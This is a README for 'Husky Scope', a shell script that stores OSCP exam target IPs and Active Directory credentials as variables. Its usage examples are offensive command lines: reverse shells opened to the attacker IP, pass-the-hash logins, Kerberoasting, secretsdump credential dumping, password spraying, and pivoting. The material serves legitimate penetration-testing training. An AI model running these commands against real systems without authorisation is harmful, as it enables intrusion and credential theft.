# Husky Scope — OSCP Exam IP Environment Manager

Set your target IPs once, use `$variables` everywhere. Auto-detects your tun0, saves config across terminal restarts, and never makes you type an IP address again.

**Part of the [Husky Hacker](https://medium.com/@TheHuskyHacker) toolkit.**

---

## Install

```bash
chmod +x scope.sh

# Optional: add an alias to your .zshrc / .bashrc
echo 'alias scope="source ~/path/to/scope.sh"' >> ~/.zshrc
```

**Important:** Always use `source` (or `.`) — not `bash`. Otherwise the variables won't persist in your shell.

---

## Exam Day — Quick Start

```bash
# Step 1: Set up all targets (interactive)
source scope.sh setup

# Step 2: Never type an IP again
nmap -sCV $T1
huskyrecon $T2
evil-winrm -i $AD_DC -u $AD_USER -p $AD_PASS
revshell -l bash -i $ATTACKER -p 4444
impacket-secretsdump "$AD_DOMAIN/$AD_USER:$AD_PASS"@$AD_DC
```

---

## Commands

| Command | What It Does |
|---|---|
| `source scope.sh setup` | Interactive setup — enter all target IPs, AD creds, auto-detect attacker IP |
| `source scope.sh show` | Display all current targets and variables |
| `source scope.sh add T1 10.10.10.5 WebBox` | Add or update a single target |
| `source scope.sh add PIVOT 172.16.0.10 Internal` | Add a custom target (any name) |
| `source scope.sh refresh` | Re-detect attacker IP from tun0 (after VPN reconnect) |
| `source scope.sh hosts` | Generate `/etc/hosts` entries ready to paste |
| `source scope.sh serve` | Start HTTP tool server on port 80 |
| `source scope.sh scanall` | Quick nmap every target at once |
| `source scope.sh reset` | Clear all targets |
| `source scope.sh` | Load saved scope (silent, for new terminals) |

---

## Variables Set

After setup, these variables are available in your shell:

### Attacker

| Variable | Description |
|---|---|
| `$ATTACKER` | Your attacker IP (auto-detected from tun0) |
| `$IFACE` | Active interface name (tun0, eth0, etc.) |
| `$TOOLS_DIR` | Path to ~/oscp-tools |

### Standalone Targets

| Variable | Description |
|---|---|
| `$T1` | Standalone target 1 IP |
| `$T1_NAME` | Standalone target 1 hostname/label |
| `$T2` | Standalone target 2 IP |
| `$T2_NAME` | Standalone target 2 hostname/label |
| `$T3` | Standalone target 3 IP |
| `$T3_NAME` | Standalone target 3 hostname/label |

### Active Directory Set

| Variable | Description |
|---|---|
| `$AD_MS01` | AD member server 1 IP |
| `$AD_MS02` | AD member server 2 IP |
| `$AD_DC` | Domain Controller IP |
| `$AD_DOMAIN` | Domain name (e.g. corp.local) |
| `$AD_USER` | Starting username from exam panel |
| `$AD_PASS` | Starting password from exam panel |

### Custom Targets (added mid-exam)

```bash
source scope.sh add PIVOT 172.16.0.10 PivotHost
# Creates $PIVOT_IP and $PIVOT_NAME

source scope.sh add DB 172.16.0.20 DatabaseServer
# Creates $DB_IP and $DB_NAME
```

---

## Usage Examples

### Recon

```bash
# Auto-recon on all standalones
huskyrecon $T1 -o ./recon/t1
huskyrecon $T2 -o ./recon/t2
huskyrecon $T3 -o ./recon/t3

# Fruit picker
fruitpicker $T1
fruitpicker $AD_MS01

# Web recon
webrecon http://$T1
webrecon http://$T2:8080

# Exploit search from nmap output
xfind nmap ./recon/t1/nmap/quick_tcp.txt
```

### Exploitation

```bash
# Reverse shells always use $ATTACKER
revshell -l bash -i $ATTACKER -p 4444
revshell -l nc-mkfifo -i $ATTACKER -p 443
revshell -l ps-b64 -i $ATTACKER -p 4444

# Web testing
webtester sqli -u "http://$T1/login.php" --param user -m POST
webtester upload -u "http://$T1/upload.php" --field file
webtester lfi -u "http://$T2/index.php" --param page
```

### Active Directory

```bash
# BloodHound collection
bloodhound-python -u $AD_USER -p $AD_PASS -d $AD_DOMAIN -ns $AD_DC -c All

# Infinite Void (AD LDAP dump)
python3 infinite_void.py -d $AD_DOMAIN -u $AD_USER -p $AD_PASS -dc $AD_DC

# Kerberoast
impacket-GetUserSPNs "$AD_DOMAIN/$AD_USER:$AD_PASS" -dc-ip $AD_DC -request

# Evil-WinRM
evil-winrm -i $AD_MS01 -u $AD_USER -p $AD_PASS
evil-winrm -i $AD_DC -u Administrator -H 'NTLM_HASH'

# CrackMapExec spray
crackmapexec smb $AD_DC -u users.txt -p $AD_PASS -d $AD_DOMAIN --continue-on-success

# AD attack chain
adchain chain "$AD_USER>GenericAll>svc_sql>DCSync>domain" -d $AD_DOMAIN --dc-ip $AD_DC -p $AD_PASS

# Secretsdump
impacket-secretsdump "$AD_DOMAIN/$AD_USER:$AD_PASS"@$AD_DC
```

### Pivoting

```bash
# Ligolo with variables
pivot ligolo -a $ATTACKER -p $AD_MS01 -n 172.16.0.0/24

# Chisel
pivot chisel -a $ATTACKER -p $T1

# Add internal target mid-exam
source scope.sh add INTERNAL 172.16.0.50 InternalWeb
nmap -sCV $INTERNAL_IP
```

### Report

```bash
# Add machines using scope variables
report add "$T1_NAME" $T1 --os Linux --points 20
report add "$T2_NAME" $T2 --os Windows --points 20
report add "$AD_DC_NAME" $AD_DC --os Windows --points 40 --domain $AD_DOMAIN
```

### /etc/hosts Setup

```bash
source scope.sh hosts
# Output:
#   10.10.10.5    WebBox
#   10.10.10.10   WinBox
#   10.10.10.100  dc01.corp.local dc01
#
# Copy and paste into: sudo nano /etc/hosts
```

---

## Persistence

Scope is saved to `~/.oscp_scope` automatically. If your terminal crashes or you open a new tab:

```bash
source scope.sh
# [+] Scope loaded — $ATTACKER=10.10.15.110
#     $T1=10.10.10.5 $T2=10.10.10.10 $T3=— $AD_DC=10.10.10.100
```

If VPN reconnects with a new IP, the attacker IP auto-refreshes from tun0 on every load. Or force it:

```bash
source scope.sh refresh
```

---

## License

MIT
